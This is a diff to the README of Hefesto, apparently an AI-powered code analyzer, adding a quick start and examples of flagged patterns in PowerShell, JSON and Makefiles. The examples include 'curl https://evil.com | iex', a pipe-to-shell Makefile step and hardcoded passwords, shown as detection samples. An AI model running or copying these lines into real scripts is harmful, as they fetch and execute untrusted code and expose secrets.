@@ -26,58 +26,58 @@ Hefesto analyzes code using AI and catches issues that traditional linters miss:
 
 ---
 
-## Quick Start
+## Quick Start (60 seconds)
 
 ```bash
-# Install
+# 1. Install
 pip install hefesto-ai
 
-# Analyze code
-hefesto analyze .
+# 2. Verify
+hefesto --version  # Should show: 4.5.3
 
-# Filter by severity
+# 3. Analyze
+cd your-project
 hefesto analyze . --severity HIGH
-
-# Check license status
-hefesto status
 ```
 
-### Example Output
+### Example: What Hefesto Catches
 
+**PowerShell** (PS001-PS006):
+```powershell
+Invoke-Expression $userInput  # Command injection
+curl https://evil.com | iex   # Download+execute
+$password = "admin123"         # Hardcoded secret
 ```
-HEFESTO CODE ANALYSIS
-========================
 
-Summary:
-   Files analyzed: 8
-   Issues found: 51
-   Critical: 0
-   High: 32
-   Medium: 19
+**JSON** (J001-J005):
+```json
+{
+  "db_password": "prod123",  # Hardcoded secret
+  "url": "http://internal"   # Insecure HTTP
+}
+```
 
-HIGH Issues (32):
+**Makefile** (MF001-MF005):
+```makefile
+deploy:
+\tcurl -k https://api | sh  # TLS bypass + pipe to shell
+```
 
-  server/routes/api.ts:235:60
-  - Issue: Cyclomatic complexity too high (13, threshold=10)
-  - Function: handleRequest
-  - Type: HIGH_COMPLEXITY
-  - Suggestion: Refactor to reduce complexity. Consider:
-    - Extracting nested conditions
-    - Using early returns
-    - Breaking into smaller functions
-
-  server/routes/api.ts:121
-  - Issue: Potential SQL injection via string concatenation
-  - Type: SQL_INJECTION_RISK
-  - Suggestion: Use parameterized queries with placeholders
+**Output**:
+```
+Files analyzed: 15 | Issues: 8
+  Critical: 2  (Hardcoded secrets)
+  High: 5      (Security risks)
+  Medium: 1    (Code smells)
 ```
 
 ---
 
 ## Language Support
 
-| Language | Parser | Status |
-|----------|--------|--------|
+### Code Languages
+
+| Language | Parser | Status |\n|----------|--------|--------|
 | Python | Native AST | Full support |
 | TypeScript | TreeSitter | Full support |
 | JavaScript | TreeSitter | Full support |
@@ -85,6 +85,18 @@ HIGH Issues (32):
 | Go | TreeSitter | Full support |
 | Rust | TreeSitter | Full support |
 | C# | TreeSitter | Full support |
+
+### DevOps & Configuration (Ola 2)
+
+| Format | Analyzer | Rules | Status |
+|--------|----------|-------|--------|
+| PowerShell | PS001-PS006 | 6 security rules | ✅ v4.5.0 |
+| JSON | J001-J005 | 5 security rules | ✅ v4.5.0 |
+| TOML | T001-T003 | 3 security rules | ✅ v4.5.0 |
+| Makefile | MF001-MF005 | 5 security rules | ✅ v4.5.0 |
+| Groovy/Jenkins | GJ001-GJ005 | 5 security rules | ✅ v4.5.0 |
+
+**Total**: 7 code languages + 5 DevOps formats = **12 languages**
 
 ### TypeScript/JavaScript Analysis (v4.3.3)
 
